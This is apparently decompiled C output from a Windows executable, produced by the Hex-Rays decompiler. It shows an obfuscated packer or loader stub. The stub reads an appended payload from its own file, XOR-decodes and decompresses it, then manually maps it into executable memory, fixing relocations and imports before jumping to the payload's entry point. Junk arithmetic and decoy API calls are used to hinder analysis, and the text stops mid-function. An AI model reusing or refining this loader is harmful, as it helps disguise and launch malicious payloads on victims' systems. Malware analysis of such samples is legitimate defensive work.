/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __cdecl sub_401000(int, int, int);
unsigned int __cdecl sub_4010A0(char *a1, int a2, unsigned int a3);
int __cdecl sub_4012A0(int *, char *);
HANDLE __cdecl sub_401320(LPCSTR lpFileName);
HWND (__stdcall *__cdecl sub_401380(int, char, int))(HWND hWndChild, HWND hWndNewParent);
// int __userpurge start@<eax>(int@<ebx>, int@<edi>, int@<esi>, HMODULE, int, int);
int __cdecl sub_401CD0(int);
int __stdcall sub_401F60(int);
int __cdecl sub_402580(int, int);
int __cdecl sub_402670(int);
BOOL __cdecl sub_4026F0(LPVOID lpMem);
LPVOID __cdecl sub_402730(SIZE_T dwBytes);
// HDDEDATA __stdcall DdeAddData(HDDEDATA hData, LPBYTE pSrc, DWORD cb, DWORD cbOff);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_401C03; // weak
// extern COLORREF (__stdcall *GetBkColor)(HDC hdc);
// extern ATOM (__stdcall *AddAtomA)(LPCSTR lpString);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern DWORD (__stdcall *SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern void (__stdcall *GetStartupInfoA)(LPSTARTUPINFOA lpStartupInfo);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern BOOL (__stdcall *VirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// extern BOOL (__stdcall *UnmapViewOfFile)(LPCVOID lpBaseAddress);
// extern LPVOID (__stdcall *MapViewOfFileEx)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap, LPVOID lpBaseAddress);
// extern HANDLE (__stdcall *CreateFileMappingA)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern HWND (__stdcall *SetParent)(HWND hWndChild, HWND hWndNewParent);
// extern HDC (__stdcall *GetDC)(HWND hWnd);
// extern HWND (__stdcall *GetDesktopWindow)();
// extern HICON (__stdcall *LoadIconA)(HINSTANCE hInstance, LPCSTR lpIconName);
// extern BOOL (__stdcall *SetCaretPos)(int X, int Y);
// extern ATOM (__stdcall *RegisterClassExW)(const WNDCLASSEXW *);
// extern SHORT (__stdcall *GetKeyState)(int nVirtKey);
// extern UINT (__stdcall *GetWindowModuleFileNameA)(HWND hwnd, LPSTR pszFileName, UINT cchFileNameMax);
// extern LRESULT (__stdcall *DefDlgProcW)(HWND hDlg, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern BOOL (__stdcall *SetMenuItemBitmaps)(HMENU hMenu, UINT uPosition, UINT uFlags, HBITMAP hBitmapUnchecked, HBITMAP hBitmapChecked);
// extern BOOL (__stdcall *GetScrollRange)(HWND hWnd, int nBar, LPINT lpMinPos, LPINT lpMaxPos);
// extern int (__stdcall *ExcludeUpdateRgn)(HDC hDC, HWND hWnd);
// extern BOOL (__stdcall *DeleteMenu)(HMENU hMenu, UINT uPosition, UINT uFlags);
// extern BOOL (__stdcall *CopyRect)(LPRECT lprcDst, const RECT *lprcSrc);
// extern HWND (__stdcall *WindowFromDC)(HDC hDC);
// extern HCURSOR (__stdcall *SetCursor)(HCURSOR hCursor);
// extern BOOL (__stdcall *GetLastInputInfo)(PLASTINPUTINFO plii);
// extern HWND (__stdcall *CreateWindowExA)(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
// extern ATOM (__stdcall *RegisterClassA)(const WNDCLASSA *lpWndClass);
// extern HCURSOR (__stdcall *LoadCursorA)(HINSTANCE hInstance, LPCSTR lpCursorName);
// extern LRESULT (__stdcall *DefWindowProcA)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern HWND (__stdcall *CreateWindowExW)(DWORD dwExStyle, LPCWSTR lpClassName, LPCWSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
// extern BOOL (__stdcall *AdjustWindowRect)(LPRECT lpRect, DWORD dwStyle, BOOL bMenu);
// extern BOOL (__stdcall *CloseClipboard)();
// extern BOOL (__stdcall *GetClientRect)(HWND hWnd, LPRECT lpRect);
// extern BOOL (__stdcall *OemToCharA)(LPCSTR pSrc, LPSTR pDst);
// extern HICON (__stdcall *CopyIcon)(HICON hIcon);
// extern BOOL (__stdcall *OemToCharW)(LPCSTR pSrc, LPWSTR pDst);
CHAR IconName[] = "PhIoNo"; // idb
CHAR aWhcb[] = "WhcB"; // idb
char aAkrbxaaefcn[12] = "akrbxaaefcn"; // weak
CHAR WindowName[] = "CLJhWMBe"; // idb
CHAR ClassName[] = "npjKNOjM"; // idb
CHAR CursorName[] = "IOLZy"; // idb
CHAR String[] = "_uPgBqrzeLaYfF_zNPOyToTlrhvOmJPLWzxvYDV"; // idb
int dword_404064 = 0; // weak
int dword_404068 = 0; // weak
int dword_40406C = 0; // weak
int dword_404070 = 0; // weak
int dword_404074 = 0; // weak
int dword_404078 = 0; // weak
int dword_40407C = 0; // weak
LPCVOID lpAddress = NULL; // idb
int dword_404084 = 0; // weak
int dword_404088 = 0; // weak
int dword_40408C = 0; // weak
int dword_404090 = 0; // weak
LPVOID lpMem = NULL; // idb
int dword_404098 = 0; // weak
int dword_40409C = 0; // weak
int dword_4040A0 = 0; // weak
int dword_4040A4 = 0; // weak
int dword_4040A8 = 0; // weak
int (__stdcall *dword_4040AC)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_4040B0 = 0; // weak
int dword_4040B4 = 0; // weak


//----- (00401000) --------------------------------------------------------
int __cdecl sub_401000(int a1, int a2, int a3)
{
  int result; // eax
  char v4; // [esp+0h] [ebp-18h]
  int i; // [esp+10h] [ebp-8h]

  dword_40406C = dword_404070 - dword_404078;
  if ( GetBkColor((HDC)0x47B9D) == -1 )
  {
    dword_404078 = 2128906;
    dword_404088 = dword_404070 >> (-37 - v4);
  }
  result = 8715820 << (v4 - 106);
  for ( i = 0; i < a3; ++i )
  {
    result = dword_40409C - 871948 - dword_404068;
    dword_4040A0 = result;
    LOBYTE(result) = *(_BYTE *)(i + a2);
    *(_BYTE *)(i + a1) = result;
  }
  return result;
}
// 401035: variable 'v4' is possibly undefined
// 404068: using guessed type int dword_404068;
// 40406C: using guessed type int dword_40406C;
// 404070: using guessed type int dword_404070;
// 404078: using guessed type int dword_404078;
// 404088: using guessed type int dword_404088;
// 40409C: using guessed type int dword_40409C;
// 4040A0: using guessed type int dword_4040A0;

//----- (004010A0) --------------------------------------------------------
unsigned int __cdecl sub_4010A0(char *a1, int a2, unsigned int a3)
{
  unsigned int result; // eax
  int v4; // eax
  int v5; // eax
  HICON hIcon; // [esp+4h] [ebp-30h]
  int v7; // [esp+8h] [ebp-2Ch]
  int v8; // [esp+Ch] [ebp-28h] BYREF
  int v9; // [esp+10h] [ebp-24h]
  int v10; // [esp+14h] [ebp-20h]
  unsigned int i; // [esp+18h] [ebp-1Ch]
  int v12; // [esp+1Ch] [ebp-18h]
  char v13; // [esp+23h] [ebp-11h]
  unsigned int v14; // [esp+24h] [ebp-10h] BYREF
  int v15; // [esp+28h] [ebp-Ch]
  unsigned int v16; // [esp+2Ch] [ebp-8h]
  char v17; // [esp+33h] [ebp-1h]

  dword_404070 = v7;
  hIcon = LoadIconA(0, IconName);
  dword_404090 = v7;
  if ( hIcon )
    dword_404090 = v7 + 1524963;
  CopyIcon(hIcon);
  result = 9470825 * dword_404078 - v7;
  dword_404078 = result;
  if ( a3 )
  {
    v13 = *a1;
    v16 = 1;
    v12 = 0;
    do
    {
      v17 = a1[v16++];
      dword_4040B0 = 491973 * dword_404074 + 195922;
      if ( v17 == v13 )
      {
        if ( a1[v16] )
        {
          dword_4040B0 = v9 * dword_4040B0 + 1369109;
          v4 = sub_4012A0((int *)&v14, &a1[v16]);
          v16 += v4;
          v10 = (dword_404068 * dword_40409C - 473815) << dword_404068;
          v5 = sub_4012A0(&v8, &a1[v16]);
          v16 += v5;
          for ( i = 0; i < v14; ++i )
          {
            v10 = 447143;
            *(_BYTE *)(v12 + a2) = *(_BYTE *)(a2 + v12 - v8);
            ++v12;
          }
        }
        else
        {
          *(_BYTE *)(v12 + a2) = v13;
          ++v12;
          dword_4040B0 = 365600 << v9;
          ++v16;
        }
      }
      else
      {
        *(_BYTE *)(v12 + a2) = v17;
        ++v12;
        v10 = 435058 << (dword_40409C * -(char)v15);
      }
      result = v16;
    }
    while ( v16 < a3 );
  }
  return result;
}
// 4010A9: variable 'v7' is possibly undefined
// 404068: using guessed type int dword_404068;
// 404070: using guessed type int dword_404070;
// 404074: using guessed type int dword_404074;
// 404078: using guessed type int dword_404078;
// 404090: using guessed type int dword_404090;
// 40409C: using guessed type int dword_40409C;
// 4040B0: using guessed type int dword_4040B0;

//----- (004012A0) --------------------------------------------------------
int __cdecl sub_4012A0(int *a1, char *a2)
{
  int v3; // [esp+0h] [ebp-20h]
  char v4; // [esp+8h] [ebp-18h]
  char v5; // [esp+Ch] [ebp-14h]
  int v6; // [esp+10h] [ebp-10h]
  int v7; // [esp+14h] [ebp-Ch]
  int v8; // [esp+18h] [ebp-8h]

  v8 = 0;
  v3 = 0;
  do
  {
    v4 = *a2++;
    dword_4040B0 = v6 >> (dword_404074 * v5);
    v8 = v4 & 0x7F | (v8 << 7);
    dword_404074 = 708831 * v7;
    ++v3;
  }
  while ( (v4 & 0x80) != 0 );
  *a1 = v8;
  return v3;
}
// 4012D5: variable 'v6' is possibly undefined
// 4012C9: variable 'v5' is possibly undefined
// 4012F4: variable 'v7' is possibly undefined
// 404074: using guessed type int dword_404074;
// 4040B0: using guessed type int dword_4040B0;

//----- (00401320) --------------------------------------------------------
HANDLE __cdecl sub_401320(LPCSTR lpFileName)
{
  HANDLE FileA; // [esp+8h] [ebp-10h]

  dword_40409C = 497375 * dword_4040B0;
  FileA = CreateFileA(lpFileName, 0x80000000, 1u, 0, 3u, 0x80u, 0);
  if ( FileA == (HANDLE)-1 )
    return 0;
  else
    return FileA;
}
// 40409C: using guessed type int dword_40409C;
// 4040B0: using guessed type int dword_4040B0;

//----- (00401380) --------------------------------------------------------
HWND (__stdcall *__cdecl sub_401380(int a1, char a2, int a3))(HWND hWndChild, HWND hWndNewParent)
{
  HWND (__stdcall *result)(HWND, HWND); // eax
  char v4; // [esp+0h] [ebp-1Ch]
  char v5; // [esp+Ch] [ebp-10h]
  int i; // [esp+14h] [ebp-8h]

  result = SetParent;
  dword_4040B0 = (int)SetParent;
  for ( i = 0; i < a3; ++i )
  {
    result = (HWND (__stdcall *)(HWND, HWND))(i + a1);
    *(_BYTE *)(i + a1) = a2;
  }
  dword_4040A0 = 490142 << (2 * v5) << v4;
  return result;
}
// 4013BA: variable 'v5' is possibly undefined
// 4013C9: variable 'v4' is possibly undefined
// 4040A0: using guessed type int dword_4040A0;
// 4040B0: using guessed type int dword_4040B0;

//----- (004013E0) --------------------------------------------------------
int __userpurge start@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, HMODULE a4, int a5, int a6)
{
  HMODULE ModuleHandleA; // eax
  HMODULE v7; // eax
  DWORD FileSize; // eax
  HWND DesktopWindow; // eax
  HMODULE v11; // eax
  SIZE_T dwBytes; // [esp+14h] [ebp-104h]
  unsigned int v13; // [esp+18h] [ebp-100h]
  struct tagRECT v14; // [esp+1Ch] [ebp-FCh] BYREF
  RECT v15; // [esp+2Ch] [ebp-ECh] BYREF
  struct tagRECT rcDst; // [esp+3Ch] [ebp-DCh] BYREF
  RECT rcSrc; // [esp+4Ch] [ebp-CCh] BYREF
  HCURSOR hCursor; // [esp+5Ch] [ebp-BCh]
  WNDCLASSA WndClass; // [esp+60h] [ebp-B8h] BYREF
  HWND Window; // [esp+88h] [ebp-90h]
  LPSTR lpFilename; // [esp+8Ch] [ebp-8Ch]
  HMODULE v22; // [esp+90h] [ebp-88h]
  DWORD nNumberOfBytesToRead; // [esp+94h] [ebp-84h]
  DWORD NumberOfBytesRead; // [esp+98h] [ebp-80h] BYREF
  LPVOID lpBuffer; // [esp+9Ch] [ebp-7Ch]
  struct _STARTUPINFOA StartupInfo; // [esp+A0h] [ebp-78h] BYREF
  HMODULE hModule; // [esp+ECh] [ebp-2Ch]
  int v28; // [esp+F0h] [ebp-28h]
  int v29; // [esp+F4h] [ebp-24h]
  int v30; // [esp+F8h] [ebp-20h]
  HANDLE hFile; // [esp+FCh] [ebp-1Ch]
  int v32; // [esp+100h] [ebp-18h]
  int v33; // [esp+104h] [ebp-14h]
  int v34; // [esp+108h] [ebp-10h]
  char *i; // [esp+10Ch] [ebp-Ch]
  int v36; // [esp+110h] [ebp-8h]
  LONG lDistanceToMove; // [esp+114h] [ebp-4h]
  int savedregs; // [esp+118h] [ebp+0h] BYREF

  dword_4040A0 = (int)AdjustWindowRect;
  dword_40409C = (int)CreateWindowExW;
  WndClass.style = 0;
  WndClass.lpfnWndProc = DefWindowProcA;
  WndClass.cbClsExtra = 0;
  v33 = (int)(&AdjustWindowRect - 32730 * (_DWORD)CreateWindowExW) >> (char)AdjustWindowRect;
  WndClass.cbWndExtra = 0;
  WndClass.hInstance = GetModuleHandleA(0);
  dword_4040B0 = dword_40409C >> (dword_40409C + 115 - v36);
  ModuleHandleA = GetModuleHandleA(0);
  WndClass.hIcon = LoadIconA(ModuleHandleA, aWhcb);
  WndClass.hCursor = LoadCursorA(0, (LPCSTR)0x7F00);
  dword_40409C = 0;
  WndClass.hbrBackground = 0;
  WndClass.lpszMenuName = 0;
  v30 = (v33 + dword_404074 - dword_4040A0) >> v33;
  WndClass.lpszClassName = aAkrbxaaefcn;
  dword_4040B0 = -v36 >> dword_404068;
  RegisterClassA(&WndClass);
  if ( a5 == 1 )
  {
    dword_404098 = 1;
    lpAddress = a4;
  }
  else
  {
    dword_404098 = 0;
  }
  v7 = GetModuleHandleA(0);
  Window = CreateWindowExA(0, ClassName, WindowName, 1u, 492646, 1396, 4421767, 4796946, 0, 0, v7, 0);
  dword_40409C = (int)GetLastInputInfo;
  v33 = 0;
  if ( dword_404098 )
    hModule = a4;
  else
    hModule = GetModuleHandleA(0);
  dword_4040B4 = v29 << v29;
  hCursor = LoadCursorA(0, CursorName);
  if ( hCursor )
  {
    dword_404090 = 0;
    SetCursor(hCursor);
    v29 = 7869262;
  }
  v29 = 0;
  v22 = hModule;
  dword_4040A0 = (int)DdeAddData;
  v34 = (dword_40409C - dword_4040B0) << v30;
  v28 = (int)hModule + *((_DWORD *)hModule + 15);
  sub_401380((int)&StartupInfo, 0, 68);
  StartupInfo.cb = 68;
  StartupInfo.lpDesktop = 0;
  dword_404068 = (v33 * v33) >> 13;
  GetStartupInfoA(&StartupInfo);
  dword_404068 = (int)WindowFromDC;
  if ( !StartupInfo.lpDesktop )
    return 0;
  v36 = dword_4040B0 >> dword_4040A0;
  rcSrc.bottom = 213857;
  v29 = 5137939 * dword_404078 - 1505126;
  rcSrc.left = 4600712;
  dword_404078 = dword_404090;
  rcSrc.right = 1176;
  dword_404070 = 2 * v29;
  rcSrc.top = 25879;
  v29 = 738525;
  CopyRect(&rcDst, &rcSrc);
  dword_404078 >>= dword_404070 + 110;
  v30 = 989348 >> v36;
  dword_40409C = (int)DeleteMenu;
  v32 = v28 + *(unsigned __int16 *)(v28 + 20) + 24;
  v32 += 40 * (*(unsigned __int16 *)(v28 + 6) - 1);
  lDistanceToMove = *(_DWORD *)(v32 + 20)
                  + *(_DWORD *)(v28 + 60)
                  * ((unsigned int)(*(_DWORD *)(v32 + 16) + *(_DWORD *)(v28 + 60) - 1)
                   / *(_DWORD *)(v28 + 60));
  dword_4040A0 = (int)ExcludeUpdateRgn;
  lpFilename = (LPSTR)sub_402730(0x200u);
  if ( !lpFilename )
    return 0;
  dword_404068 = (int)GetScrollRange;
  GetModuleFileNameA(hModule, lpFilename, 0x200u);
  dword_404090 = v29 * dword_404090 - dword_404078;
  v15.bottom = 13363;
  dword_404088 = v29 - 8192138;
  v15.left = 6764679;
  dword_404078 = 5586853 >> (2 * v29);
  v15.right = 10136;
  dword_40406C += v29 - dword_4040B4;
  v15.top = 27012;
  v29 -= dword_40406C;
  CopyRect(&v14, &v15);
  dword_404078 = 9514160;
  v34 = 330566 * dword_4040B0 - 792083;
  hFile = sub_401320(lpFilename);
  if ( !hFile )
    return 0;
  v30 = (v36 + 755310) << (-124 - dword_4040A0);
  dword_40409C = (int)SetMenuItemBitmaps;
  FileSize = GetFileSize(hFile, 0);
  nNumberOfBytesToRead = FileSize - lDistanceToMove;
  dword_404068 = (int)DefDlgProcW;
  if ( FileSize == lDistanceToMove )
    return 0;
  lpBuffer = sub_402730(nNumberOfBytesToRead + 16);
  if ( !lpBuffer )
    return 0;
  dword_404074 <<= dword_404068;
  SetFilePointer(hFile, lDistanceToMove, 0, 0);
  if ( !ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, &NumberOfBytesRead, 0) )
    return 0;
  if ( NumberOfBytesRead != nNumberOfBytesToRead )
    return 0;
  dword_404074 = (int)GetWindowModuleFileNameA;
  v34 = v36 << (dword_404068 - 77 * v30);
  CloseHandle(hFile);
  dword_40409C = (int)GetKeyState;
  if ( NumberOfBytesRead != nNumberOfBytesToRead )
    return 0;
  dword_404074 = (int)RegisterClassExW;
  sub_401000((int)lpBuffer, (int)lpBuffer + nNumberOfBytesToRead - 64, 64);
  dword_4040B0 = (int)SetCaretPos;
  v29 = dword_404088;
  if ( !AddAtomA(String) )
  {
    dword_404078 = 3946228 * v29;
    dword_404088 = 183105;
  }
  dword_40406C = 8191223 >> dword_404070;
  v13 = *(_DWORD *)lpBuffer;
  dword_40409C = (int)OemToCharW;
  v29 = 2 * dword_404090 + 1300354;
  DesktopWindow = GetDesktopWindow();
  if ( !GetDC(DesktopWindow) )
  {
    v29 = v29 << dword_40406C << v29;
    dword_404088 = 4543457;
  }
  dwBytes = *((_DWORD *)lpBuffer + 1);
  for ( i = 0; (unsigned int)i < v13; i += 8 )
  {
    *(_DWORD *)((char *)lpBuffer + (_DWORD)i + 8) ^= 0x457u;
    v30 = dword_4040B0 + 106872 - v33;
  }
  lpMem = sub_402730(dwBytes);
  if ( !lpMem )
    ExitProcess(0x9541u);
  sub_4010A0((char *)lpBuffer + 8, (int)lpMem, v13);
  i = (char *)&loc_401C03;
  v30 = 907531 - v34;
  dword_4040A8 = (int)NtCurrentTeb();
  v36 = 907531;
  dword_40407C = a2;
  dword_404064 = a3;
  dword_40408C = a1;
  v33 >>= 21;
  dword_404084 = (int)&savedregs;
  dword_404068 = dword_4040A0 + v33;
  if ( dword_404098 )
  {
    sub_401CD0(i - (_BYTE *)lpAddress);
  }
  else
  {
    v11 = GetModuleHandleA(0);
    sub_401CD0(i - (char *)v11);
  }
  if ( !sub_401F60((int)lpMem) )
  {
    sub_4026F0(lpMem);
    ExitProcess(0x283338u);
  }
  dword_4040A0 = v34 >> dword_4040A0;
  dword_40409C = 346496 << dword_40409C >> ((dword_404068 >> v34) + 33);
  return dword_4040AC(a4, a5, a6);
}
// 404064: using guessed type int dword_404064;
// 404068: using guessed type int dword_404068;
// 40406C: using guessed type int dword_40406C;
// 404070: using guessed type int dword_404070;
// 404074: using guessed type int dword_404074;
// 404078: using guessed type int dword_404078;
// 40407C: using guessed type int dword_40407C;
// 404084: using guessed type int dword_404084;
// 404088: using guessed type int dword_404088;
// 40408C: using guessed type int dword_40408C;
// 404090: using guessed type int dword_404090;
// 404098: using guessed type int dword_404098;
// 40409C: using guessed type int dword_40409C;
// 4040A0: using guessed type int dword_4040A0;
// 4040A8: using guessed type int dword_4040A8;
// 4040AC: using guessed type int (__stdcall *dword_4040AC)(_DWORD, _DWORD, _DWORD);
// 4040B0: using guessed type int dword_4040B0;
// 4040B4: using guessed type int dword_4040B4;

//----- (00401CD0) --------------------------------------------------------
int __cdecl sub_401CD0(int a1)
{
  HMODULE ModuleHandleA; // [esp+4h] [ebp-3Ch]
  _DWORD *v3; // [esp+8h] [ebp-38h]
  int v4; // [esp+Ch] [ebp-34h]
  SIZE_T *v5; // [esp+10h] [ebp-30h]
  unsigned int v6; // [esp+18h] [ebp-28h]
  int v7; // [esp+24h] [ebp-1Ch]
  int v8; // [esp+28h] [ebp-18h]
  _DWORD *i; // [esp+30h] [ebp-10h]
  int v10; // [esp+34h] [ebp-Ch]
  unsigned int j; // [esp+38h] [ebp-8h]
  int v12; // [esp+3Ch] [ebp-4h]

  dword_4040A0 = (int)OemToCharA;
  dword_40409C = (int)GetClientRect;
  if ( dword_404098 )
    ModuleHandleA = (HMODULE)lpAddress;
  else
    ModuleHandleA = GetModuleHandleA(0);
  if ( !ModuleHandleA )
    return 0;
  dword_4040B0 = (int)CloseClipboard;
  v5 = (SIZE_T *)((char *)ModuleHandleA + *((_DWORD *)ModuleHandleA + 15));
  dword_4040A4 = (int)VirtualAlloc(0, v5[20], 0x3000u, 0x40u);
  if ( dword_4040A4 )
  {
    dword_4040A0 = 146514 << (dword_4040A0 - 96);
    sub_401000(dword_4040A4, (int)ModuleHandleA, v5[20]);
    v4 = dword_4040A4 - (_DWORD)ModuleHandleA;
    if ( v5[41] )
    {
      for ( i = (_DWORD *)((char *)ModuleHandleA + v5[40]); i[1]; i = (_DWORD *)((char *)i + i[1]) )
      {
        v6 = (unsigned int)(i[1] - 8) >> 1;
        v7 = (v8 - v12 * v7) << v8;
        v3 = i + 2;
        dword_40409C = v12 - 198608;
        for ( j = 0; j < v6; ++j )
        {
          dword_404074 = (799285 * v10 - 399158920 - v8) << (-89 - dword_4040A0);
          if ( (int)*((unsigned __int16 *)v3 + j) >> 12 == 3 )
            *(_DWORD *)(*i + dword_4040A4 + (*((_WORD *)v3 + j) & 0xFFF)) += v4;
        }
      }
    }
    __asm { jmp     eax }
  }
  return 0;
}
// 401DF4: variable 'v8' is possibly undefined
// 401DED: variable 'v12' is possibly undefined
// 401DED: variable 'v7' is possibly undefined
// 401DCE: variable 'v10' is possibly undefined
// 404074: using guessed type int dword_404074;
// 404098: using guessed type int dword_404098;
// 40409C: using guessed type int dword_40409C;
// 4040A0: using guessed type int dword_4040A0;
// 4040A4: using guessed type int dword_4040A4;
// 4040B0: using guessed type int dword_4040B0;

//----- (00401F60) --------------------------------------------------------
int __stdcall sub_401F60(int a1)
{
  const CHAR *j; // [esp+4h] [ebp-54h]
  _DWORD *v3; // [esp+Ch] [ebp-4Ch]
  char *v4; // [esp+10h] [ebp-48h]
  int v5; // [esp+14h] [ebp-44h]
  char *v6; // [esp+14h] [ebp-44h]
  char v7; // [esp+18h] [ebp-40h]
  int *v8; // [esp+1Ch] [ebp-3Ch]
  const CHAR *v9; // [esp+20h] [ebp-38h]
  unsigned int v10; // [esp+24h] [ebp-34h]
  int v11; // [esp+2Ch] [ebp-2Ch]
  _DWORD *v12; // [esp+30h] [ebp-28h]
  int *v13; // [esp+34h] [ebp-24h]
  int v14; // [esp+3Ch] [ebp-1Ch]
  const CHAR *k; // [esp+40h] [ebp-18h]
  HMODULE hModule; // [esp+44h] [ebp-14h]
  int v17; // [esp+48h] [ebp-10h]
  unsigned int i; // [esp+4Ch] [ebp-Ch]
  unsigned int m; // [esp+4Ch] [ebp-Ch]
  HANDLE hFileMappingObject; // [esp+50h] [ebp-8h]

  v5 = *(_DWORD *)(a1 + 60) + a1;
  v12 = (_DWORD *)(v5 + *(unsigned __int16 *)(v5 + 20) + 24);
  v9 = (const CHAR *)VirtualAlloc(0, *(_DWORD *)(v5 + 80), 0x3000u, 0x40u);
  if ( !v9 )
    return 0;
  dword_40409C = v11 >> (dword_4040A0 - 93) >> v7;
  sub_401000((int)v9, a1, *(_DWORD *)(a1 + 60) + 40 * *(unsigned __int16 *)(v5 + 6) + 312);
  for ( i = 0; i < *(unsigned __int16 *)(v5 + 6); ++i )
  {
    if ( v12[5] )
    {
      if ( v12[4] )
        sub_401000(
          (int)&v9[v12[3]],
          v12[5] + a1,
          *(_DWORD *)(v5 + 60) * ((unsigned int)(v12[4] + *(_DWORD *)(v5 + 60) - 1) / *(_DWORD *)(v5 + 60)));
    }
    dword_404068 = dword_404074 + v11 * v14;
    v12 += 10;
  }
  v6 = (char *)&v9[*((_DWORD *)v9 + 15)];
  for ( j = &v9[*((_DWORD *)v6 + 32)]; *((_DWORD *)j + 4); j += 20 )
  {
    hModule = GetModuleHandleA(&v9[*((_DWORD *)j + 3)]);
    if ( !hModule )
    {
      if ( dword_404098 )
        return 0;
      hModule = LoadLibraryA(&v9[*((_DWORD *)j + 3)]);
      dword_404068 = (626861 * dword_404068) >> 21;
      if ( !hModule )
        return 0;
    }
    dword_404068 = 273681 * dword_40409C;
    if ( *(_DWORD *)j )
    {
      v13 = (int *)&v9[*(_DWORD *)j];
      v8 = (int *)&v9[*((_DWORD *)j + 4)];
    }
    else
    {
      v13 = (int *)&v9[*((_DWORD *)j + 4)];
      v8 = (int *)&v9[*(_DWORD *)j];
    }
    v17 = 0;
    if ( *((_DWORD *)j + 4) && *(_DWORD *)j )
      v17 = 1;
    while ( *v13 )
    {
      dword_404074 = 0;
      if ( *v13 >= 0 )
        *v13 = (int)GetProcAddress(hModule, &v9[*v13 + 2]);
      else
        *v13 = (int)GetProcAddress(hModule, (LPCSTR)(*v13 & 0x7FFFFFFF));
      if ( !*v13 )
        return 0;
      if ( v17 )
        *v8 = *v13;
      ++v13;
      ++v8;
    }
  }
  if ( dword_404098 )
  {
    v4 = (char *)lpAddress - *((_DWORD *)v6 + 13);
    if ( *((_DWORD *)v6 + 41) )
    {
      for ( k = &v9[*((_DWORD *)v6 + 40)]; *((_DWORD *)k + 1); k += *((_DWORD *)k + 1) )
      {
        v10 = (unsigned int)(*((_DWORD *)k + 1) - 8) >> 1;
        v3 = k + 8;
        for ( m = 0; m < v10; ++m )
        {
          if ( (int)*((unsigned __int16 *)v3 + m) >> 12 == 3 )
            *(_DWORD *)&v9[*(_DWORD *)k + (*((_WORD *)v3 + m) & 0xFFF)] += v4;
        }
      }
    }
  }
  hFileMappingObject = CreateFileMappingA((HANDLE)0xFFFFFFFF, 0, 4u, 0, *((_DWORD *)v6 + 20), 0);
  if ( !hFileMappingObject )
    return 0;
  dword_4040A0 = (dword_404074 * dword_404068) << v11;
  if ( dword_404098 )
    dword_4040A4 = (int)MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, (LPVOID)lpAddress);
  else
    dword_4040A4 = (int)MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, *((LPVOID *)v6 + 13));
  if ( dword_4040A4 )
    goto LABEL_66;
  if ( dword_404098 )
  {
    if ( !UnmapViewOfFile(lpAddress) && !VirtualFree((LPVOID)lpAddress, 0, 0x8000u) )
      return 0;
  }
  else if ( !UnmapViewOfFile(*((LPCVOID *)v6 + 13)) && !VirtualFree(*((LPVOID *)v6 + 13), 0, 0x8000u) )
  {
    return 0;
  }
  dword_4040A4 = (int)(dword_404098 ? MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, (LPVOID)lpAddress) : MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, *((LPVOID *)v6 + 13)));
  if ( !dword_4040A4 )
  {
    dword_4040A4 = (int)(dword_404098 ? VirtualAlloc((LPVOID)lpAddress, *((_DWORD *)v6 + 20), 0x3000u, 0x40u) : VirtualAlloc(*((LPVOID *)v6 + 13), *((_DWORD *)v6 + 20), 0x3000u, 0x40u));
    if ( !dword_4040A4 )
      return 0;
  }
LABEL_66:
  sub_401000(dword_4040A4, (int)v9, *((_DWORD *)v6 + 20));
  if ( dword_404098 )
    sub_402580((int)lpAddress, *((_DWORD *)v6 + 10) + dword_4040A4);
  else
    sub_402670(dword_4040A4);
  dword_4040AC = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))(*((_DWORD *)v6 + 10) + dword_4040A4);
  *((_DWORD *)v6 + 10) = dword_4040AC;
  return 1;
